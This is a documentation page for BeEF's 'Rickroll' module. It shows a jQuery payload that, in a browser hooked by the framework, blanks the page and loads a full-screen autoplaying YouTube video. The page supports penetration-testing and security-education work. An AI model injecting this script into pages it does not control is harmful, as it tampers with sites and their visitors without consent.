## Summary

* **Objective**: Replace the body of the page with a full screen Rickroll
* **Authors**: Yori Kvitchko
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/browser/hooked_domain/rickroll)

## Internal Working

By default, this replaces all `<embed>` tags to a youtube video of rickroll.


```js

$j('body').html('');

$j('body').css({'padding':'0px', 'margin':'0px', 'height':'100%'});
$j('html').css({'padding':'0px', 'margin':'0px', 'height':'100%'});

$j('body').html('<iframe width="100%" height="100%" src="//www.youtube.com/embed/DLzxrzFCyOs?autoplay=1" allow="autoplay; encrypted-media" frameborder="0" allowfullscreen></iframe>');

```

## Feedback

